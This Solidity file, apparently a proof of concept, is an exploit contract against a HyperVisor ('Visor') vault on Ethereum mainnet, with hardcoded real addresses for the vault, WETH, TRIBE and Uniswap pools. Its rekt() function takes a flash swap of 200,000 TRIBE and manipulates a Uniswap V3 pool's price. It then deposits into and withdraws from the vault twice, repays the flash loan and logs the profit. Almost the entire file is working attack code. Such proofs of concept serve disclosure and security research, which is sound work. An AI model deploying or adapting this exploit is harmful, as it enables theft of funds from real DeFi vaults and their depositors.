// SPDX-License-Identifier: MIT

pragma solidity ^0.7.6;

import "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import "@uniswap/v3-core/contracts/interfaces/IUniswapV3Pool.sol";
import "../interfaces/IHyperVisor.sol";
import "@uniswap/v3-periphery/contracts/interfaces/external/IWETH9.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "hardhat/console.sol";

contract VisorPOC {

    uint160 internal constant MIN_SQRT_RATIO = 4295128739;
    uint160 internal constant MAX_SQRT_RATIO = 1461446703485210103287273052203988822378723970342;

    IWETH9 constant weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);
    IUniswapV2Pair constant feiTribeV2pool = IUniswapV2Pair(0x9928e4046d7c6513326cCeA028cD3e7a91c7590A);
    IUniswapV3Pool constant wethTribeV3pool = IUniswapV3Pool(0xf87bb87fD9EA1C260ddf77B9c707aD9437fF8364);
    IERC20 constant tribe = IERC20(0xc7283b66Eb1EB5FB86327f08e1B5816b0720212B);
    IHyperVisor visor = IHyperVisor(0x3F805DE0ec508BF7311baaa617015809BE9CE953);

    uint256 constant tribeAmount = 200_000 ether;

    function rekt() public {
        console.log("calling rekt now");
        feiTribeV2pool.swap(0, tribeAmount, address(this), bytes("0"));
        uint256 balance = tribe.balanceOf(address(this));
        console.log("Profit: ", balance);
    }

    function uniswapV2Call(address, uint, uint amount1, bytes calldata) external {
        require(msg.sender == address(feiTribeV2pool));
        wethTribeV3pool.swap(address(this), false, int256(tribeAmount), MAX_SQRT_RATIO - 1, bytes(""));
        weth.approve(address(visor), type(uint256).max);
        visor.deposit(weth.balanceOf(address(this)), 0, address(this));
        visor.withdraw(visor.balanceOf(address(this)), address(this), address(this));
        visor.deposit(weth.balanceOf(address(this)), 0, address(this));
        visor.withdraw(visor.balanceOf(address(this)), address(this), address(this));
        wethTribeV3pool.swap(address(this), true, int256(weth.balanceOf(address(this))), MIN_SQRT_RATIO + 1, bytes(""));
        tribe.transfer(address(feiTribeV2pool), amount1 * 1000 / 997 + 1);
    }

    function uniswapV3SwapCallback(int256 amount0Delta, int256 amount1Delta, bytes calldata) external {
        require(msg.sender == address(wethTribeV3pool));
        if (amount0Delta > 0) {
            weth.transfer(address(wethTribeV3pool), uint256(amount0Delta));
        }
        if (amount1Delta > 0) {
            tribe.transfer(address(wethTribeV3pool), uint256(amount1Delta));
        }
    }
}
